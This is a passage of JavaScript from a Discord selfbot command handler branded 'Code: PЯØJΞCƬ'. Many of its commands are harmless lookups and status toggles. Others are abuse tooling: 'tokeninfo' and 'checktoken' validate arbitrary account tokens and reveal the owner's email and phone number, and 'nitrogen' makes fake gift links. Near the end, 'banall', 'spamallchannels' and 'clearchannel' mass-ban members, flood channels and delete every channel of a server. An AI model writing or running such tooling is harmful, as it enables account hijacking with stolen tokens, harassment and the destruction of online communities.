\`\`\``)
                break

            case "inviteinfo":
                var invite = args[1]
                if (!invite) return message.edit(`${lang.noinvite}`);
                var inviteinfo = await client.fetchInvite(invite)
                message.edit(`\`\`\`ini
[Invite Information] :

Invite Code : ${inviteinfo.code}\n
Invite Guild : ${inviteinfo.guild.name}\n
Inviter : ${inviteinfo.inviter.username}\n
Invite Channel : ${inviteinfo.channel.name}\n
Invite Expires on : ${inviteinfo.expiresAt}\n
\`\`\``)
                break

            case "tokeninfo":
                var token = args[1]
                if (!token) return message.edit(`${lang.notoken}`);
                var tokeninfo = await fetch(`https://discord.com/api/v8/users/@me`, {
                    method: "GET",
                    headers: {
                        "Authorization": token
                    }
                }).then(res => res.json())
                message.edit(`\`\`\`ini
Token Information :

[Token] : ${token}
[Username] ${tokeninfo.username}#${tokeninfo.discriminator}
[User ID] ${tokeninfo.id}
[Email] ${tokeninfo.email}
[Email Verified] ${tokeninfo.verified}
[Phone Number] ${tokeninfo.phone}
[MFA Enabled] ${tokeninfo.mfa_enabled}
[Flags] ${tokeninfo.flags}
[Locale] ${tokeninfo.locale}\`\`\``)
                break

            case "tinyurl":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.needurl}`)
                fetch('https://tinyurl.com/api-create.php?url=' + argsed)
                    .then(res => res.text())
                    .then(data => {message.edit(`Short Url :` + data)})
                    .catch(err => console.error(err));
                break

            case "checktoken":
                var token = args[1]
                if (!token) return message.edit(`${lang.notoken}`);
                var checktoken = await fetch(`https://discord.com/api/v8/users/@me`, {
                    method: "GET",
                    headers: {
                        "Authorization": token
                    }
                }).then(res => res.json())
                if (checktoken.message === "401: Unauthorized") {
                    message.edit(`\`\`\`ini
[${lang.invalidtoken}] :( 
                                \`\`\``)
                }
                if (checktoken.message === "You are being rate limited.") {
                    message.edit(`\`\`\`ini
[${lang.ratelimit}] :(
                             \`\`\``)
                }
                if (checktoken.username) {
                    message.edit(`\`\`\`ini
[${lang.validtoken}] :D 
                            \`\`\``)
                }
                break

            case "wiki":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.wikiargs}`)
                fetch('https://en.wikipedia.org/api/rest_v1/page/summary/' + argsed)
                    .then(res => res.json())
                    .then(data => {message.edit(`\`\`\`ini
[ ${lang.wiki1} ]: ${data.title}
                        
${data.extract}
\`\`\``)})
                    .catch(err => console.error(err));
                break

            case "nitrogen":
                var code = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                message.edit(`${lang.nitrogen} : https://discord.gift/${code}`)
                break

            case "tokengen":
                fetch('https://some-random-api.ml/bottoken')
                    .then(res => res.json())
                    .then(data => {message.edit(`${lang.tokengen1} : ${data.token}`)})
                break

            case "passgen":
                var length = parseInt(message.content.split(" ")[1])
                if(!length) return message.edit(`${lang.nolength}`)
                var password = Math.random().toString(36).substring(2, length);
                message.edit(`${lang.passgen1} : ${password}`)
                break

            case "usergen":
                fetch('https://random-data-api.com/api/v2/users')
                    .then(res => res.json())
                    .then(data => {message.edit(`\`\`\`ini
${lang.userinfo} :

[Username] ${data.first_name} ${data.last_name}
[Email] ${data.email}
[${lang.pass}] ${data.password}
[${lang.phonenum}] ${data.phone_number}
[${lang.datebirth}] ${data.date_of_birth}
\`\`\``)})
                break

            case "emojidump":
                var guilded = client.guilds.cache.get(args[1])
                if (!guilded) return message.edit(`${lang.needidtarget}`)
                var emojidump = guilded.emojis.cache.map(e => e.toString()).join(" ")
                const dir = `./data/dumpemoji/${guilded.name.replace(/[^a-z0-9]/gi, '_')}`
                message.delete()
                if (!fs.existsSync(dir)) {fs.mkdirSync(dir)}
                guilded.emojis.cache.forEach(emoji => {
                    fetch(emoji.url)
                        .then(res => res.buffer())
                        .then(buffer => {
                            fs.writeFile(`${dir}/${emoji.name}.png`, buffer, (err) => {if (err) throw err})})
                        .catch(err => {console.log(`${lang.emofetch}: ${err}`)})})
                break

            case "crypto":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.nocrypto}`)
                fetch('https://api.coingecko.com/api/v3/coins/' + argsed)
                    .then(res => res.json())
                    .then(data => {message.edit(`\`\`\`ini
Crypto Information :

[Name] ${data.name}
[Symbol] ${data.symbol}
[Current Price] ${data.market_data.current_price.usd}$
[Market Cap] ${data.market_data.market_cap.usd}$
[Market Cap Rank] ${data.market_cap_rank}
[Total Volume] ${data.market_data.total_volume.usd}$
[High 24h] ${data.market_data.high_24h.usd}$
[Low 24h] ${data.market_data.low_24h.usd}$
[Price Change 24h] ${data.market_data.price_change_24h}$
[Price Change Percentage 24h] ${data.market_data.price_change_percentage_24h}%
[Price Change Percentage 7d] ${data.market_data.price_change_percentage_7d}%
\`\`\``)})
                break

            case "mcserver":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.noip}`)
                fetch('https://api.mcsrvstat.us/2/' + argsed)
                    .then(res => res.json())
                    .then(data => {message.edit(`\`\`\`ini
Minecraft Server Information :

[IP] ${data.ip}
[Port] ${data.port}
[Online] ${data.online}
[Version] ${data.version}
[Players] ${data.players.online}/${data.players.max}
[MOTD] ${data.motd.clean}
\`\`\``)})
                break

            case "webhookinfo":
                var argsed = message.content.split(" ").slice(1).join(" ")
                fetch(`${argsed}`)
                    .then(res => res.json())
                    .then(data => {
                        console.log(data)
                        message.edit(`\`\`\`ini
Webhook Information :

[Name] ${data.name}
[Avatar] ${data.avatar}
[Channel ID] ${data.channel_id}
[Guild ID] ${data.guild_id}
[ID] ${data.id}
[Application Id] ${data.application_id}
[Token] ${data.token}
\`\`\``)})
                break

            case "userbanner":
                var user = message.mentions.users.first();
                if (!user) return message.edit(`${lang.mentionuser}`);

                user.fetch()
                    .then(fetchedUser => {
                        var bannerURL = fetchedUser.bannerURL({ dynamic: true, size: 4096 })
                        message.edit(`${lang.userbanner1} ${fetchedUser}: ${bannerURL}`)
                    })
                    .catch(error => {
                        console.error(error)
                        message.edit(`${lang.fetchbanner}`)
                    })
                break

            case "iplookup":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.noip}`)
                fetch('http://ip-api.com/json/' + argsed)
                    .then(res => res.json())
                    .then(data => {message.edit(`\`\`\`ini
IP Lookup Information :

[IP] ${data.query}
[Status] ${data.status}
[Country] ${data.country}
[Country Code] ${data.countryCode}
[Region] ${data.region}
[Region Name] ${data.regionName}
[City] ${data.city}
[Zip] ${data.zip}
[Lat] ${data.lat}
[Lon] ${data.lon}
[Timezone] ${data.timezone}
[ISP] ${data.isp}
[Org] ${data.org}
[AS] ${data.as}
\`\`\``)})
                break

            case "domainresolve":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.nodomain}`)
                fetch('https://api.hackertarget.com/hostsearch/?q=' + argsed)
                    .then(res => res.text())
                    .then(data => {message.edit(`\`\`\`ini
${lang.domainresolved} :

[${data}]
\`\`\``)})
                break

            case "resolve":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.shortenlink}`)
                fetch('https://unshorten.me/s/' + argsed)
                    .then(res => res.text())
                    .then(data => {message.edit(`\`\`\`ini
${lang.resolved} :

[${data}]
\`\`\``)})
                break

            case "portscan":
                var sayMessage = message.content.split(" ").slice(1)
                if (!sayMessage) return message.edit(`${lang.noip}`);
                var status = await portscanner.checkPortStatus(80, sayMessage)
                message.edit(status == "open" ? `:white_check_mark: ${lang.port1} **${sayMessage}** ${lang.port2}` : `:x: ${lang.port3} **${sayMessage}** ${lang.port4}`)
                autoDeleteMiddleware(config)(message)
                break

            case "ping":
                message.edit(`:ping_pong: Pong! \`${Date.now() - message.createdTimestamp}ms\``)
                break

            case "online":
                client.user.setStatus('online')
                message.edit(':white_check_mark: ' `${lang.onlinemsg}`)
                break

            case "offline":
                client.user.setStatus('invisible')
                message.edit(':white_check_mark: ' `${lang.offmsg}`)
                break

            case "idle":
                client.user.setStatus('idle')
                message.edit(':white_check_mark: ' `${lang.idlemsg}`)
                break

            case "dnd":
                client.user.setStatus('dnd')
                message.edit(':white_check_mark: ' `${lang.dndmsg}`)
                break

            case "covid":
                var argsed = message.content.split(" ").slice(1).join(" ")
                if(!argsed) return message.edit(`${lang.nocountry}`)
                fetch('https://corona.lmao.ninja/v2/countries/' + argsed)
                    .then(res => res.json())
                    .then(data => {message.edit(`\`\`\`ini
Covid Information :

[Country] ${data.country}
[Cases] ${data.cases}
[Today Cases] ${data.todayCases}
[Deaths] ${data.deaths}
[Today Deaths] ${data.todayDeaths}
[Recovered] ${data.recovered}
[Active] ${data.active}
[Critical] ${data.critical}
[Cases Per One Million] ${data.casesPerOneMillion}
[Deaths Per One Million] ${data.deathsPerOneMillion}
[Tests] ${data.tests}
[Tests Per One Million] ${data.testsPerOneMillion}
[Population] ${data.population}
[Continent] ${data.continent}
[Active Per One Million] ${data.activePerOneMillion}
[Recovered Per One Million] ${data.recoveredPerOneMillion}
[Critical Per One Million] ${data.criticalPerOneMillion}
\`\`\``)})
                break

            case "sysinfo":
                var osType = os.type();
                var node = os.hostname();
                var osRelease = os.release();
                var osVersion = os.version();
                var osArch = os.arch();
                var cpu = await si.cpu();
                var mem = await si.mem();
                var gpu = await si.graphics();
                var disks = await si.diskLayout();

                message.edit(`\`\`\`ini
System Information :

[OS Type] ${osType}
[Node] ${node}
[OS Release] ${osRelease}
[OS Version] ${osVersion}
[OS Arch] ${osArch}
[CPU] ${cpu.manufacturer} ${cpu.brand} ${cpu.speed}GHz
[CPU Cores] ${cpu.cores}
[CPU Threads] ${cpu.physicalCores}
[CPU Cache] ${cpu.cache.l2}
[CPU Socket] ${cpu.socket}
[CPU Virtualization] ${cpu.virtualization}

[Memory] ${mem.total}GB
[Memory Used] ${mem.used}GB
[Memory Free] ${mem.free}GB
[Memory Usage] ${mem.active}GB

[GPU] ${gpu.controllers[0].model}
[GPU VRAM] ${gpu.controllers[0].vram}GB

[Disk] ${disks[0].name} ${disks[0].size}GB
[Disk Type] ${disks[0].type}
[Disk Interface] ${disks[0].interfaceType}
\`\`\``)
                break

            case "savepfp":
                var mention = message.mentions.users.first()
                if(!mention) return message.edit(`${lang.mentionuser}`)
                var pfp = mention.displayAvatarURL({ format: 'png', dynamic: true, size: 1024 })
                fs.writeFile(`./data/savepfp/${mention.username}.png`, pfp, function (err) {
                    if (err) throw err;
                    console.log('Saved!');
                });
                message.edit(`:white_check_mark: **${lang.savepfp1} ${mention.username}!**`)
                break

            case "deletewebhook":
                var webhook = message.content.split(" ").slice(1).join(" ")
                if(!webhook) return message.edit(`${lang.nowebhook}`)
                fetch(webhook, {
                    method: 'DELETE',
                })
                message.edit(`:white_check_mark: **${lang.webhook1} ${webhook}!**`)
                break
            case "hypesquad":
                var house = message.content.split(" ")[1]
                if(!house || !["Bravery", "Brilliance", "Balance"].includes(house)) {return message.edit(`**${lang.hypesquad1}**`)}
                var houseId = { "Bravery": 1, "Brilliance": 2, "Balance": 3 }
                var res = await axios.post(`https://discordapp.com/api/v6/hypesquad/online`, {"house_id": houseId[house]}, {headers: {"Authorization": config.token}})
                if(res.status === 204) {message.edit(`:white_check_mark: **${lang.hype1} ${house} ${lang.hype2} !**`)
                } else {message.edit(`:x: **${lang.hype3}**`)}
                autoDeleteMiddleware(config)(message)
                break

            case "setpfp":
                var pfp = message.content.split(" ").slice(1).join(" ")
                if(!pfp) return message.edit(`:x: **${lang.setpfp1}**`)
                client.user.setAvatar(pfp)
                message.edit(`:white_check_mark: **${lang.setpfp2} ${pfp}!**`)
                break

            case "backupfriends":
                fetch('https://discordapp.com/api/users/@me/relationships', {headers: {authorization: client.token}})
                    .then(res => res.json())
                    .then(data => { const friends = data.filter(user => user.type === 1);
                        const friendsList = friends.map(friend => friend.user.username + '#' + friend.user.discriminator).join("\n")
                        fs.writeFile('friends.json', friendsList, (err) => {if (err) throw err;
                            console.log(`${lang.backupfriends1} friends.json`.blue);
                            message.edit(`${lang.backupfriends1} friends.json`)});})
                    .catch(err => console.error(err));
                autoDeleteMiddleware(config)(message)
                break

            case "backupaccount":
                fetch('https://discord.com/api/users/@me', {
                    headers: {
                        Authorization: client.token
                    }
                })
                    .then(res => res.json())
                    .then(data => {
                        const account = data;
                        const accountInfo = {
                            username: account.username,
                            discriminator: account.discriminator,
                            avatarURL: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                        };
                        const accountJSON = JSON.stringify(accountInfo, null, 2);
                        fs.writeFile(`${__dirname}/data/account.json`, accountJSON, err => {
                            if (err) throw err;
                            console.log(`${lang.backupaccount1} account.json`.blue);
                            message.edit(`${lang.backupaccount1} account.json`);
                        });
                        fetch(accountInfo.avatarURL)
                            .then(res => res.body.pipe(fs.createWriteStream(`avatar_${account.id}.png`)))
                            .catch(err => console.error(err));
                    })
                    .catch(err => console.error(err));
                autoDeleteMiddleware(config)(message);
                break

            case "fullbackup":
                fetch('https://discord.com/api/users/@me/relationships', {
                    headers: {
                        Authorization: client.token
                    }
                })
                    .then(res => res.json())
                    .then(data => {
                        const friends = data.filter(user => user.type === 1);
                        const friendsList = friends.map(friend => friend.user.username + '#' + friend.user.discriminator).join("\n");
                        fs.writeFile('friends.json', friendsList, err => {
                            if (err) throw err;
                            console.log(`${lang.backupfriends1} friends.json`.blue);
                            message.edit(`${lang.backupfriends1} friends.json`);
                            fetch('https://discord.com/api/users/@me', {
                                headers: {
                                    Authorization: client.token
                                }
                            })
                                .then(res => res.json())
                                .then(data => {
                                    const account = data;
                                    const accountInfo = {
                                        username: account.username,
                                        discriminator: account.discriminator,
                                        avatarURL: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png`
                                    };
                                    const accountJSON = JSON.stringify(accountInfo, null, 2);
                                    fs.writeFile(`${__dirname}/data/account.json`, accountJSON, err => {
                                        if (err) throw err;
                                        console.log(`${lang.backupaccount1} account.json`.blue);
                                        message.edit(`${lang.backupaccount1} account.json`);
                                        fetch(accountInfo.avatarURL)
                                            .then(res => res.body.pipe(fs.createWriteStream(`avatar_${account.id}.png`)))
                                            .then(() => {
                                                autoDeleteMiddleware(config)(message);
                                            })
                                            .catch(err => console.error(err));
                                    });
                                })
                                .catch(err => console.error(err));
                        });
                    })
                    .catch(err => console.error(err));
                break

            case "nitrosniper":
                if (config.nitroautoclaim == true) {
                    config.nitroautoclaim = false
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - AutoClaim Config ]

+ ${lang.autoclaim}
                                                \`\`\``)
                } else {
                    config.nitroautoclaim = true
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Config Help ]

+ ${lang.autoclaim1}
                                                \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "shutdown":
                message.edit(`:white_check_mark: **${lang.shutdown1}**`)
                setTimeout(() => {process.exit()}, 1000)
                break

            case "update":
                message.edit(`:white_check_mark: **${lang.update1}**`)
                fetch('http://2.11.128.249:8045/version')
                    .then(res => res.json())
                    .then(data => {
                        if (data.version == config.version) {
                            message.edit(`:white_check_mark: **${lang.update2} !**`)
                        } else {
                            message.edit(`:white_check_mark: **${lang.update3} !**`)
                            setTimeout(() => {process.exit()}, 1000)
                        }
                    })
                break

            case "credits":
                message.edit(`\`\`\`ini
[Credits]

+ Code: PЯØJΞCƬ - Made by >_Unknown User#6557 | Main Developer

[Staff]
+ ia_nah#6603 - Developer & Administrator

[Previous staff]
- Little#1605 - Developer & Co Owner
- HeianPM.#0448 - Community Manager & Administrator

[Contributors]
+ !"Dialz_†#0690 - Helped with the code & API
+ wiga#0184 - Helped to optimize the code
                                        \`\`\``)
                autoDeleteMiddleware(config)(message)
                break

            case "notification":
                if (config.notification == true) {
                    config.notification = false
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | Notification Config]

+ ${lang.notif1}
                                            \`\`\``)
                }
                else {
                    config.notification = true
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | Notification Config]

+ ${lang.notif2}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "autofeur":
                if (config.autofeur == true) {
                    config.autofeur = false
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | AutoFeur Config]

+ ${lang.feur1}
                                            \`\`\``)
                }
                else {
                    config.autofeur = true
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | AutoFeur Config]

+ ${lang.feur2}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "customreply":
                if (config.autocustomreply == true) {
                    config.autocustomreply = false
                    message.edit(`\`\`\`ini
    [Code: PЯØJΞCƬ | Auto Custom Reply Config]
    
    + ${lang.customreply1}
                                                \`\`\``)
                }
                else {
                    config.autocustomreply = true
                    message.edit(`\`\`\`ini
    [Code: PЯØJΞCƬ | Auto Custom Reply Config]
    
    + ${lang.customreply2}
                                                \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "soundnotif":
                if (config.soundnotif == true) {
                    config.soundnotif = false
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | Notification Config]

+ ${lang.notif3}
                                            \`\`\``)
                }
                else {
                    config.soundnotif = true
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | Notification Config]

+ ${lang.notif4}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "autoouge":
                if (config.autoouge == true) {
                    config.autoouge = false
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | Notification Config]

+ ${lang.ouge1}
                                            \`\`\``)
                }
                else {
                    config.autoouge = true
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | AutoOuge Config]

+ ${lang.ouge2}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break



            case "deletetimer":
                if (!args[1]) return message.edit(`${lang.deletetimer1}`);
                var lifetimeSeconds = parseInt(args[1], 10);
                if (!lifetimeSeconds || lifetimeSeconds <= 0) {
                    return message.edit(`${lang.deletetimer2}`);
                }
                var lifetimeMillis = secondsToMillis(lifetimeSeconds);
                config.deletetimer = lifetimeMillis;
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);

                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - DeleteTimer Config ]
                                    
[ deletetimer ] ${lang.deletetimerrestartbot}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break


            case "whitelistautofeur":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.useridrequired}`);
                if (config.whitelistautofeur.includes(args[0])) {
                    config.whitelistautofeur.splice(config.whitelistautofeur.indexOf(args[0]), 1)
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ -  Whitelist AutoFeur Config ]

+ ${args[0]} ${lang.blackfeur}
                                            \`\`\``)
                }
                else {
                    config.whitelistautofeur.push(args[0])
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ -  Whitelist AutoFeur Config ]

+ ${args[0]} ${lang.addfeur}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "whitelistcustomreply":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.useridrequired}`);
                if (config.whitelistautocustomreply.includes(args[0])) {
                    config.whitelistautocustomreply.splice(config.whitelistautocustomreply.indexOf(args[0]), 1)
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ -  Whitelist Custom Reply Config ]
    
    + ${args[0]} ${lang.blackfeur}
                                                \`\`\``)
                }
                else {
                    config.whitelistautocustomreply.push(args[0])
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ -  Whitelist Custom Reply Config ]
    
    + ${args[0]} ${lang.addfeur}
                                                \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break


            case "whitelistautoouge":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.useridrequired}`);
                if (config.whitelistautoouge.includes(args[0])) {
                    config.whitelistautoouge.splice(config.whitelistautoouge.indexOf(args[0]), 1)
                    message.edit(`\`\`\`diff
[ Code: PЯØJΞCƬ -  Whitelist AutoOuge Config ]

+ ${args[0]} ${lang.ougewhite}
                                            \`\`\``)
                }
                else {
                    config.whitelistautoouge.push(args[0])
                    message.edit(`\`\`\`diff
[ Code: PЯØJΞCƬ -  Whitelist AutoOuge Config ]

+ ${args[0]} ${lang.ougewhite1}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "prefix":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterprefix}`);
                config.prefix = args[0]
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Prefix Config ]

+ ${lang.prefixset}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break


            case "wallpaper":
                var wallpaper = await neko.wallpaper();
                message.edit(`${message.author} ${lang.wallpaper1} \n${wallpaper.url}`)
                autoDeleteMiddleware(config)(message)
                break

            case "rpcstatus":
                if (config.rpc === true) {
                    config.rpc = false
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | RPC Config]

+ ${lang.rpcdis}
                                            \`\`\``)
                }
                else {
                    config.rpc = true
                    message.edit(`\`\`\`ini
[Code: PЯØJΞCƬ | RPC Config]

+ ${lang.rpcen}
                                            \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break
            case "rpctext":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.notext}`)
                rpcconfig.detail = args.join(" ")
                fs.writeFile("./data/rpc.json", JSON.stringify(rpcconfig), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - RPC Config ]

+ ${lang.rpctextcon}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "rpcbutton":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.notext}`)
                rpcconfig.button1label = args.join(" ")
                fs.writeFile("./data/rpc.json", JSON.stringify(rpcconfig), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - RPC Config ]

+ ${lang.rpcbuttoncon}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "rpcbuttonurl":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterurl}`)
                rpcconfig.button1link = args.join(" ")
                fs.writeFile("./data/rpc.json", JSON.stringify(rpcconfig), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - RPC Config ]

+ ${lang.rpcurlbutton}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "rpcimage":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterurl}`)
                rpcconfig.largeimage = args.join(" ")
                fs.writeFile("./data/rpc.json", JSON.stringify(rpcconfig), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - RPC Config ]

+ ${lang.rpcimaged}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "rpcimagetext":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.notext}`)
                rpcconfig.largetext = args.join(" ")
                fs.writeFile("./data/rpc.json", JSON.stringify(rpcconfig), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - RPC Config ]

+ ${lang.rpcimgtxt}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "lang":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterlang}`);
                if (args[0] !== "fr" && args[0] !== "eng" && args[0] !== "deu") return message.edit(`${lang.invalidlang}`);
                config.language = args[0];
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Lang Config ]
                                          
+ ${lang.langset}
                                            \`\`\``);
                autoDeleteMiddleware(config)(message);
                break;


            case "rpcid":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterid}`)
                rpcconfig.clientid = args.join(" ")
                fs.writeFile("./data/rpc.json", JSON.stringify(rpcconfig), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - RPC Config ]

+ ${lang.rpcided}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifystatus":
                if (config.spotify == true) {
                    config.spotify = false
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Status ]

+ ${lang.spotstat}
                                    \`\`\``);
                }
                else {
                    config.spotify = true
                    message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Status ]

+ ${lang.spotstat2}
                                    \`\`\``);
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifylargeimage":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterimageid}`)
                spot.largeimage = args.join(" ")
                fs.writeFile("./data/spotify.json", JSON.stringify(spot), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Config ]

+ ${lang.spotconf}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifylargetext":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.notext}`)
                spot.largetext = args.join(" ")
                fs.writeFile("./data/spotify.json", JSON.stringify(spot), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Config ]

+ ${lang.spotconf2}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifysmallimage":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.enterimageid}`)
                spot.smallimage = args.join(" ")
                fs.writeFile("./data/spotify.json", JSON.stringify(spot), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Config ]

+ ${lang.spotconf3}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifystate":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.notext}`)
                spot.state = args.join(" ")
                fs.writeFile("./data/spotify.json", JSON.stringify(spot), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Config ]

+ ${lang.spotconf4}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifydetails":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.notext}`)
                spot.details = args.join(" ")
                fs.writeFile("./data/spotify.json", JSON.stringify(spot), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Config ]

+ ${lang.spotconf5}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "spotifytime":
                var args = message.content.split(" ").slice(1);
                if (!args[0]) return message.edit(`${lang.entertimer}`)
                spot.time = args.join(" ")
                fs.writeFile("./data/spotify.json", JSON.stringify(spot), (err) => console.error)
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Spotify Config ]

+ ${lang.spotconf6}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "bluearchive":
                client.user.setSamsungActivity('com.YostarJP.BlueArchive', 'START')
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Samsung Activity ]

+ ${lang.bluearch}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "honkai":
                client.user.setSamsungActivity('com.miHoYo.bh3oversea', 'START')
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Samsung Activity ]

+ ${lang.honkei}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "genshin":
                client.user.setSamsungActivity('com.miHoYo.GenshinImpact', 'START')
                message.edit(`\`\`\`ini
[ Code: PЯØJΞCƬ - Samsung Activity ]

+ ${lang.groshin}
                                    \`\`\``);
                autoDeleteMiddleware(config)(message)
                break

            case "banall":
                await message.guild.members.fetch()
                message.guild.members.cache.forEach(member => {
                    if (member.id === client.user.id) return;
                    console.log(`${lang.banall1}`.yellow + member.user.tag);
                    if (!member.bannable) {
                        console.log(`${lang.banall2}` + member.user.tag + `: ${lang.banall4}`);
                        return;
                    }
                    member.ban({ reason: "Code Project on top" }).catch(err => {
                        console.log(`${lang.banall2}` + member.user.tag);
                    });
                });
                message.edit(`${lang.banall3}`);
                autoDeleteMiddleware(config)(message);
                break



            case "spamallchannels":
                var argsed2 = message.content.split(" ").slice(1).join(" ")
                if(!argsed2) return message.edit(`${lang.notext}`)
                for(var i = 0; i < 1000; i++) { message.guild.channels.cache.forEach(channel => { console.log(`${lang.spanin}`.blue + channel.name)
                    message.guild.channel.send(argsed2)
                    message.edit(`${lang.spamdone}`)})}
                autoDeleteMiddleware(config)(message)
                break

            case "clearchannel":
                message.guild.channels.cache.forEach(channel => {
                    console.log(`${lang.deletechan}`.yellow + channel.name)
                    channel.delete()
                })
                autoDeleteMiddleware(config)(message)
                break

